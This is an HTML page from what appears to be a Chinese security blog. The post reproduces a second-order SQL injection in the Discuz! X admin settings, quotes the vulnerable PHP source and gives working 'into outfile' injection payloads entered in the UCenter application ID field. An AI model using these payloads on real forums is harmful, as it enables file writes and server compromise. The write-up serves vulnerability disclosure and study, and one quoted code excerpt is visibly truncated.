@@ -1,0 +1,401 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>She11c0de&#39;s blogs</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="Discuz! X 系列全版本 后台Sql注入漏洞一、漏洞简介利用条件： 1.知道网站的绝对路径 2.secure_file_priv的值为空 二、漏洞影响Discuz!X 系列全版本 截止到 Discuz!X 3.4 R20191201 UTF-8 三、复现过程挖过discuz 漏洞的都知道 它会对大部分传参进来的值进行过滤和校验，所以当时找了一个二次注入的点 uc_server\model\b">
+<meta property="og:type" content="article">
+<meta property="og:title" content="She11c0de&#39;s blogs">
+<meta property="og:url" content="https://she11c0de.github.io/2022/07/07/Discuz/Discuz!%20X%20%E7%B3%BB%E5%88%97%E5%85%A8%E7%89%88%E6%9C%AC%20%E5%90%8E%E5%8F%B0Sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/index.html">
+<meta property="og:site_name" content="She11c0de&#39;s blogs">
+<meta property="og:description" content="Discuz! X 系列全版本 后台Sql注入漏洞一、漏洞简介利用条件： 1.知道网站的绝对路径 2.secure_file_priv的值为空 二、漏洞影响Discuz!X 系列全版本 截止到 Discuz!X 3.4 R20191201 UTF-8 三、复现过程挖过discuz 漏洞的都知道 它会对大部分传参进来的值进行过滤和校验，所以当时找了一个二次注入的点 uc_server\model\b">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://she11c0de.github.io/resource/Discuz!X%E7%B3%BB%E5%88%97%E5%85%A8%E7%89%88%E6%9C%AC%E5%90%8E%E5%8F%B0Sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/media/rId24.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/Discuz!X%E7%B3%BB%E5%88%97%E5%85%A8%E7%89%88%E6%9C%AC%E5%90%8E%E5%8F%B0Sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/media/rId25.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/Discuz!X%E7%B3%BB%E5%88%97%E5%85%A8%E7%89%88%E6%9C%AC%E5%90%8E%E5%8F%B0Sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/media/rId26.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/Discuz!X%E7%B3%BB%E5%88%97%E5%85%A8%E7%89%88%E6%9C%AC%E5%90%8E%E5%8F%B0Sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/media/rId27.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/Discuz!X%E7%B3%BB%E5%88%97%E5%85%A8%E7%89%88%E6%9C%AC%E5%90%8E%E5%8F%B0Sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/media/rId28.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/Discuz!X%E7%B3%BB%E5%88%97%E5%85%A8%E7%89%88%E6%9C%AC%E5%90%8E%E5%8F%B0Sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/media/rId29.png">
+<meta property="article:published_time" content="2022-07-08T06:25:54.588Z">
+<meta property="article:modified_time" content="2022-07-08T07:24:51.675Z">
+<meta property="article:author" content="She11c0de">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://she11c0de.github.io/resource/Discuz!X%E7%B3%BB%E5%88%97%E5%85%A8%E7%89%88%E6%9C%AC%E5%90%8E%E5%8F%B0Sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/media/rId24.png">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  <link type="text/css" href="//netdna.bootstrapcdn.com/font-awesome/4.2.0/css/font-awesome.css" rel="stylesheet">
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+<link rel="stylesheet" href="/css/scrollUp/image.css">
+
+  <!--[if lt IE 9]><script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7/html5shiv.min.js"></script><![endif]-->
+  
+<meta name="generator" content="Hexo 5.4.2"></head>
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <div class="logo">
+        <img src="/logo.png" alt="Profile Picture">
+      </div>
+      <div id="title">She11c0de's blogs</div>
+      
+       <ul class="my-socials">
+  
+ 
+</ul>
+    </div>
+  </div>
+  <div id="header-inner" class="">
+    <nav id="main-nav">
+      <a id="main-nav-toggle" class="nav-icon"></a>
+      <!--
+        
+          
+            <a class="main-nav-link" href="/">首页</a>
+          
+            <a class="main-nav-link" href="/categories/life">生活</a>
+          
+            <a class="main-nav-link" href="/archives">归档</a>
+          
+        
+      -->
+    </nav>
+    <nav id="title-nav" style="display:none">
+      <a href="/">She11c0de&#39;s blogs</a>
+      <img src="/logo.png" alt="Profile Picture">
+      <!--
+      <span id="title-nav-socials">
+        
+       
+     </span>
+      -->
+    </nav>
+    <nav id="sub-nav">
+      
+      <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+    </nav>
+    <div id="search-form-wrap">
+      <form action="http://www.baidu.com/baidu" method="get" accept-charset="utf-8" class="search-form">
+        <input type="search" name="word" maxlength="20" class="search-form-input" placeholder="搜索">
+        <input type="submit" value="" class="search-form-submit">
+        <input name=tn type=hidden value="bds">
+        <input name=cl type=hidden value="3">
+        <input name=ct type=hidden value="2097152">
+        <input type="hidden" name="si" value="she11c0de.github.io">
+      </form>
+    </div>
+  </div>
+  <div class="site-nav" style="display: none;">
+    <ul>
+      
+      
+        <li><a href="/">首页</a></li>
+      
+        <li><a href="/categories/life">生活</a></li>
+      
+        <li><a href="/archives">归档</a></li>
+      
+      
+    </ul>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-Discuz/Discuz! X 系列全版本 后台Sql注入漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Discuz/Discuz!%20X%20%E7%B3%BB%E5%88%97%E5%85%A8%E7%89%88%E6%9C%AC%20%E5%90%8E%E5%8F%B0Sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="article-date">
+  <time datetime="2022-07-08T06:25:54.588Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="Discuz-X-系列全版本-后台Sql注入漏洞"><a href="#Discuz-X-系列全版本-后台Sql注入漏洞" class="headerlink" title="Discuz! X 系列全版本 后台Sql注入漏洞"></a>Discuz! X 系列全版本 后台Sql注入漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>利用条件：</p>
+<p>1.知道网站的绝对路径</p>
+<p>2.secure_file_priv的值为空</p>
+<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>Discuz!X 系列全版本 截止到 Discuz!X 3.4 R20191201 UTF-8</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p>挖过discuz 漏洞的都知道 它会对大部分传参进来的值进行过滤和校验<br>，所以当时找了一个二次注入的点</p>
+<p>uc_server\model\base.php 37行</p>
+<pre><code>&lt;?php
+
+/*
+[UCenter] (C)2001-2099 Comsenz Inc.
+This is NOT a freeware, use is subject to license terms
+
+$Id: base.php 1167 2014-11-03 03:06:21Z hypowang $
+*/
+
+!defined(&#39;IN_UC&#39;) &amp;&amp; exit(&#39;Access Denied&#39;);
+
+class base &#123;
+
+    var $sid;
+    var $time;
+    var $onlineip;
+    var $db;
+    var $view;
+    var $user = array();
+    var $settings = array();
+    var $cache = array();
+    var $app = array();
+    var $lang = array();
+    var $input = array();
+
+    function __construct() &#123;
+        $this-&gt;base();
+    &#125;
+
+    function base() &#123;
+        $this-&gt;init_var();
+        $this-&gt;init_db();
+        $this-&gt;init_cache();
+        $this-&gt;init_app();
+        $this-&gt;init_user();
+        $this-&gt;init_template();
+        $this-&gt;init_note(); //跟进
+        $this-&gt;init_mail();
+    &#125;
+</code></pre>
+<p>uc_server\model\base.php 198行 开始</p>
+<pre><code>function init_note() &#123;
+     if($this-&gt;note_exists()) &#123; //跟进
+         $this-&gt;load(&#39;note&#39;);
+         $_ENV[&#39;note&#39;]-&gt;send();
+     &#125;
+ &#125;
+
+ function note_exists() &#123;
+     $noteexists = $this-&gt;db-&gt;result_first(&quot;SELECT value FROM &quot;.UC_DBTABLEPRE.&quot;vars WHERE name=&#39;noteexists&quot;.UC_APPID.&quot;&#39;&quot;); //从配置文件取值UC_APPID    
+         return FALSE;
+     &#125; else &#123;
+         return TRUE;
+     &#125;
+ &#125;
+</code></pre>
+<p>查找UC_APPID</p>
+<p>source\admincp\admincp_setting.php 2523行</p>
+<pre><code>$settingnew = $_GET[&#39;settingnew&#39;]; //传入
+
+    if($operation == &#39;credits&#39;) &#123;
+        $extcredits_exists = 0;
+        foreach($settingnew[&#39;extcredits&#39;] as $val) &#123;
+            if(isset($val[&#39;available&#39;]) &amp;&amp; $val[&#39;available&#39;] == 1) &#123;
+                $extcredits_exists = 1;
+                break;
+            &#125;
+        &#125;
+        if(!$extcredits_exists) &#123;
+            cpmsg(&#39;setting_extcredits_must_available&#39;);
+        &#125;
+        if($settingnew[&#39;report_reward&#39;]) &#123;
+            $settingnew[&#39;report_reward&#39;][&#39;min&#39;] = intval($settingnew[&#39;report_reward&#39;][&#39;min&#39;]);
+            $settingnew[&#39;report_reward&#39;][&#39;max&#39;] = intval($settingnew[&#39;report_reward&#39;][&#39;max&#39;]);
+            if($settingnew[&#39;report_reward&#39;][&#39;min&#39;] &gt; $settingnew[&#39;report_reward&#39;][&#39;max&#39;]) &#123;
+                unset($settingnew[&#39;report_reward&#39;]);
+            &#125;
+            if($settingnew[&#39;report_reward&#39;][&#39;min&#39;] == $settingnew[&#39;report_reward&#39;][&#39;max&#39;]) &#123;
+                $settingnew[&#39;report_reward&#39;] = array(&#39;min&#39; =&gt; &#39;&#39;, &#39;max&#39; =&gt; &#39;&#39;);
+            &#125;
+            $settingnew[&#39;report_reward&#39;] = serialize($settingnew[&#39;report_reward&#39;]);
+        &#125;
+        $settingnew[&#39;creditspolicy&#39;] = @dunserialize($setting[&#39;creditspolicy&#39;]);
+        $settingnew[&#39;creditspolicy&#39;][&#39;lowerlimit&#39;] = array();
+        foreach($settingnew[&#39;lowerlimit&#39;] as $key =&gt; $value) &#123;
+            if($settingnew[&#39;extcredits&#39;][$key][&#39;available&#39;]) &#123;
+                $settingnew[&#39;creditspolicy&#39;][&#39;lowerlimit&#39;][$key] = (float)$value;
+            &#125;
+        &#125;
+        unset($settingnew[&#39;lowerlimit&#39;]);
+    &#125;
+if($operation == &#39;uc&#39; &amp;&amp; is_writeable(&#39;./config/config_ucenter.php&#39;) &amp;&amp; $isfounder) &#123;
+        require_once &#39;./config/config_ucenter.php&#39;;
+
+        $ucdbpassnew = $settingnew[&#39;uc&#39;][&#39;dbpass&#39;] == &#39;********&#39; ? addslashes(UC_DBPW) : addslashes($settingnew[&#39;uc&#39;][&#39;dbpass&#39;]);
+        $settingnew[&#39;uc&#39;][&#39;key&#39;] = addslashes($settingnew[&#39;uc&#39;][&#39;key&#39;] == &#39;********&#39; ? addslashes(UC_KEY) : $settingnew[&#39;uc&#39;][&#39;key&#39;]);
+
+        if(function_exists(&quot;mysql_connect&quot;) &amp;&amp; ini_get(&quot;mysql.allow_local_infile&quot;)==&quot;1&quot; &amp;&amp; constant(&quot;UC_DBHOST&quot;) != $settingnew[&#39;uc&#39;][&#39;dbhost&#39;])&#123;
+            cpmsg(&#39;uc_config_load_data_local_infile_error&#39;, &#39;&#39;, &#39;error&#39;);
+        &#125;
+
+        if($settingnew[&#39;uc&#39;][&#39;connect&#39;]) &#123;
+            $uc_dblink = function_exists(&quot;mysql_connect&quot;) ? @mysql_connect($settingnew[&#39;uc&#39;][&#39;dbhost&#39;], $settingnew[&#39;uc&#39;][&#39;dbuser&#39;], $ucdbpassnew, 1) : new mysqli($settingnew[&#39;uc&#39;][&#39;dbhost&#39;], $settingnew[&#39;uc&#39;][&#39;dbuser&#39;], $ucdbpassnew);
+            if(!$uc_dblink) &#123;
+                cpmsg(&#39;uc_database_connect_error&#39;, &#39;&#39;, &#39;error&#39;);
+            &#125; else &#123;
+                if(function_exists(&quot;mysql_connect&quot;)) &#123;
+                    mysql_close($uc_dblink);
+                &#125; else &#123;
+                    $uc_dblink-&gt;close();
+                &#125;
+            &#125;
+        &#125;
+
+        $fp = fopen(&#39;./config/config_ucenter.php&#39;, &#39;r&#39;);
+        $configfile = fread($fp, filesize(&#39;./config/config_ucenter.php&#39;));
+        $configfile = trim($configfile);
+        $configfile = substr($configfile, -2) == &#39;?&gt;&#39; ? substr($configfile, 0, -2) : $configfile;
+        fclose($fp);
+
+        $connect = &#39;&#39;;
+        $settingnew[&#39;uc&#39;] = daddslashes($settingnew[&#39;uc&#39;]);
+        if($settingnew[&#39;uc&#39;][&#39;connect&#39;]) &#123;
+            $connect = &#39;mysql&#39;;
+            $samelink = ($dbhost == $settingnew[&#39;uc&#39;][&#39;dbhost&#39;] &amp;&amp; $dbuser == $settingnew[&#39;uc&#39;][&#39;dbuser&#39;] &amp;&amp; $dbpw == $ucdbpassnew);
+            $samecharset = !($dbcharset == &#39;gbk&#39; &amp;&amp; UC_DBCHARSET == &#39;latin1&#39; || $dbcharset == &#39;latin1&#39; &amp;&amp; UC_DBCHARSET == &#39;gbk&#39;);
+            $configfile = str_replace(&quot;define(&#39;UC_DBHOST&#39;, &#39;&quot;.addslashes(UC_DBHOST).&quot;&#39;)&quot;, &quot;define(&#39;UC_DBHOST&#39;, &#39;&quot;.$settingnew[&#39;uc&#39;][&#39;dbhost&#39;].&quot;&#39;)&quot;, $configfile);
+            $configfile = str_replace(&quot;define(&#39;UC_DBUSER&#39;, &#39;&quot;.addslashes(UC_DBUSER).&quot;&#39;)&quot;, &quot;define(&#39;UC_DBUSER&#39;, &#39;&quot;.$settingnew[&#39;uc&#39;][&#39;dbuser&#39;].&quot;&#39;)&quot;, $configfile);
+            $configfile = str_replace(&quot;define(&#39;UC_DBPW&#39;, &#39;&quot;.addslashes(UC_DBPW).&quot;&#39;)&quot;, &quot;define(&#39;UC_DBPW&#39;, &#39;&quot;.$ucdbpassnew.&quot;&#39;)&quot;, $configfile);
+            if(!preg_match(&#39;/^[\w\d\_]+$/&#39;, $settingnew[&#39;uc&#39;][&#39;dbtablepre&#39;]) || !preg_match(&#39;/^[\w\d\_]+$/&#39;, $settingnew[&#39;uc&#39;][&#39;dbname&#39;])) &#123;
+                cpmsg(&#39;uc_config_write_error&#39;, &#39;&#39;, &#39;error&#39;);
+            &#125;
+            $configfile = str_replace(&quot;define(&#39;UC_DBNAME&#39;, &#39;&quot;.addslashes(UC_DBNAME).&quot;&#39;)&quot;, &quot;define(&#39;UC_DBNAME&#39;, &#39;&quot;.$settingnew[&#39;uc&#39;][&#39;dbname&#39;].&quot;&#39;)&quot;, $configfile);
+            $configfile = str_replace(&quot;define(&#39;UC_DBTABLEPRE&#39;, &#39;&quot;.addslashes(UC_DBTABLEPRE).&quot;&#39;)&quot;, &quot;define(&#39;UC_DBTABLEPRE&#39;, &#39;`&quot;.$settingnew[&#39;uc&#39;][&#39;dbname&#39;].&#39;`.&#39;.$settingnew[&#39;uc&#39;][&#39;dbtablepre&#39;].&quot;&#39;)&quot;, $configfile);
+        &#125;
+        $configfile = str_replace(&quot;define(&#39;UC_CONNECT&#39;, &#39;&quot;.addslashes(UC_CONNECT).&quot;&#39;)&quot;, &quot;define(&#39;UC_CONNECT&#39;, &#39;&quot;.$connect.&quot;&#39;)&quot;, $configfile);
+        $configfile = str_replace(&quot;define(&#39;UC_KEY&#39;, &#39;&quot;.addslashes(UC_KEY).&quot;&#39;)&quot;, &quot;define(&#39;UC_KEY&#39;, &#39;&quot;.$settingnew[&#39;uc&#39;][&#39;key&#39;].&quot;&#39;)&quot;, $configfile);
+        $configfile = str_replace(&quot;define(&#39;UC_API&#39;, &#39;&quot;.addslashes(UC_API).&quot;&#39;)&quot;, &quot;define(&#39;UC_API&#39;, &#39;&quot;.$settingnew[&#39;uc&#39;][&#39;api&#39;].&quot;&#39;)&quot;, $configfile);
+        $configfile = str_replace(&quot;define(&#39;UC_IP&#39;, &#39;&quot;.addslashes(UC_IP).&quot;&#39;)&quot;, &quot;define(&#39;UC_IP&#39;, &#39;&quot;.$settingnew[&#39;uc&#39;][&#39;ip&#39;].&quot;&#39;)&quot;, $configfile);
+        $configfile = str_replace(&quot;define(&#39;UC_APPID&#39;, &#39;&quot;.addslashes(UC_APPID).&quot;&#39;)&quot;, &quot;define(&#39;UC_APPID&#39;, &#39;&quot;.$settingnew[&#39;uc&#39;][&#39;appid&#39;].&quot;&#39;)&quot;, $configfile);
+
+        $fp = fopen(&#39;./config/config_ucenter.php&#39;, &#39;w&#39;);
+        if(!($fp = @fopen(&#39;./config/config_ucenter.php&#39;, &#39;w&#39;))) &#123;
+            cpmsg(&#39;uc_config_write_error&#39;, &#39;&#39;, &#39;error&#39;);
+        &#125;
+        @fwrite($fp, trim($configfile)); // 写入到config_ucenter.php 可控UC_APPID 的值 通过上面代码可以看出来只简单的addslashes了一下
+        @fclose($fp);
+    &#125;
+
+    isset($settingnew[&#39;regname&#39;]) &amp;&amp; empty($settingnew[&#39;regname&#39;]) &amp;&amp; $settingnew[&#39;regname&#39;] = &#39;register&#39;;
+    isset($settingnew[&#39;reglinkname&#39;]) &amp;&amp; empty($settingnew[&#39;reglinkname&#39;]) &amp;&amp; $settingnew[&#39;reglinkname&#39;] = cplang(&#39;reglinkname_default&#39;);
+    $nohtmlarray = array(&#39;bbname&#39;, &#39;regname&#39;, &#39;reglinkname&#39;, &#39;icp&#39;, &#39;sitemessage&#39;, &#39;site_qq&#39;);
+    foreach($nohtmlarray as $k) &#123;
+        if(isset($settingnew[$k])) &#123;
+            $settingnew[$k] = dhtmlspecialchars($settingnew[$k]);
+        &#125;
+    &#125;
+
+    if(isset($settingnew[&#39;statcode&#39;])) &#123;
+        $settingnew[&#39;statcode&#39;] = preg_replace(&#39;/language\s*=[\s|\&#39;|\&quot;]*php/is&#39;, &#39;_&#39;, $settingnew[&#39;statcode&#39;]);
+        $settingnew[&#39;statcode&#39;] = str_replace(array(&#39;&lt;?&#39;, &#39;?&gt;&#39;), array(&#39;&lt;?&#39;, &#39;?&gt;&#39;), $settingnew[&#39;statcode&#39;]);
+    &#125;
+</code></pre>
+<p>转义一次的字符串被写人文件中，在PHP解析时就是没有转义过的原始内容<br>造成了二次注入的产生</p>
+<pre><code>&lt;?php
+define(&#39;UC_APPID&#39;, &#39;sadsadsadasd\&#39;&#39;);
+printf(UC_APPID);
+</code></pre>
+<p><img src="/resource/Discuz!X%E7%B3%BB%E5%88%97%E5%85%A8%E7%89%88%E6%9C%AC%E5%90%8E%E5%8F%B0Sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/media/rId24.png"></p>
+<p>漏洞验证</p>
+<p><img src="/resource/Discuz!X%E7%B3%BB%E5%88%97%E5%85%A8%E7%89%88%E6%9C%AC%E5%90%8E%E5%8F%B0Sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/media/rId25.png"></p>
+<p><img src="/resource/Discuz!X%E7%B3%BB%E5%88%97%E5%85%A8%E7%89%88%E6%9C%AC%E5%90%8E%E5%8F%B0Sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/media/rId26.png"></p>
+<p><img src="/resource/Discuz!X%E7%B3%BB%E5%88%97%E5%85%A8%E7%89%88%E6%9C%AC%E5%90%8E%E5%8F%B0Sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/media/rId27.png"></p>
+<p>直接构造语句</p>
+<pre><code>1&#39; into outfile &#39;c:\\wamp64\\tmp\\1.txt&#39;  -- a
+</code></pre>
+<p><img src="/resource/Discuz!X%E7%B3%BB%E5%88%97%E5%85%A8%E7%89%88%E6%9C%AC%E5%90%8E%E5%8F%B0Sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/media/rId28.png"></p>
+<p><img src="/resource/Discuz!X%E7%B3%BB%E5%88%97%E5%85%A8%E7%89%88%E6%9C%AC%E5%90%8E%E5%8F%B0Sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/media/rId29.png"></p>
+<p>构造报错注入</p>
+<h3 id="补充："><a href="#补充：" class="headerlink" title="补充："></a>补充：</h3><p>UCenter 应用 ID填入exp，然后提交</p>
+<pre><code>1&#39; union select &#39;abc&#39;  into outfile &#39;c:\6.txt&#39; -- a
+</code></pre>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Discuz/Discuz!%20X%20%E7%B3%BB%E5%88%97%E5%85%A8%E7%89%88%E6%9C%AC%20%E5%90%8E%E5%8F%B0Sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" data-id="cl5c2qnsl004ty8v1594teghs" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2022/07/07/Discuz/Discuz!%20X%20%E7%B3%BB%E5%88%97%E5%85%A8%E7%89%88%E6%9C%AC%20%E7%89%88%E6%9C%AC%E8%BD%AC%E6%8D%A2%E5%8A%9F%E8%83%BD%E5%AF%BC%E8%87%B4Getshell/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          (no title)
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2022/07/07/Discuz/Discuz!%20X%20_%203.4%20uc_center%20%E5%90%8E%E5%8F%B0%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title"></div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2022 She11c0de<br>
+      Theme <a href="https://github.com/henryhuang/oishi" target="_blank">Oishi</a>, Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <!--
+      <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">首页</a>
+  
+    <a href="/categories/life" class="mobile-nav-link">生活</a>
+  
+    <a href="/archives" class="mobile-nav-link">归档</a>
+  
+</nav>
+    -->
+    
+
+<!-- 百度分享 start -->
+
+<!-- 百度分享 end -->
+
+<script src="//cdn.bootcss.com/jquery/1.11.1/jquery.min.js"></script>
+
+
+
+
+<script src="/js/jquery.scrollUp.min.js"></script>
+
+
+<script src="/js/jquery.transform.js"></script>
+
+
+<script src="/js/menu.js"></script>
+
+
+
+<script src="/js/script.js"></script>
+
+
+<script src="/js/scrollUp.js"></script>
+
+
+  </div>
+</body>
+</html>
